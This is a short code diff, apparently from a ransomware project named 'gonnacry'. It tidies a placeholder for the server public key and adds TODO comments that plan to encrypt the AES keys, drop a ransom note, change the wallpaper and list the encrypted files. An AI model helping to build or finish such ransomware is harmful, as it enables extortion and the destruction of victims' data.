@@ -10,9 +10,7 @@ from Crypto.PublicKey import RSA
 import gc
 
 # const variables
-server_public_key = tuple("""
- SERVER PUBLIC KEY WILL BE HERE
-""")
+server_public_key = tuple("""SERVER PUBLIC KEY WILL BE HERE""")
 
 ransomware_name = tuple("gonnacry")
 
@@ -58,8 +56,11 @@ def menu():
     # rsa_object = None # ????
     # gc.clean()
 
+    # TODO
     # encrypt all the AES keys with Client public key 
-
+    # create file with description of what happened
+    # change wallpaper
+    # create file with all encrypted files path's
 
 
 
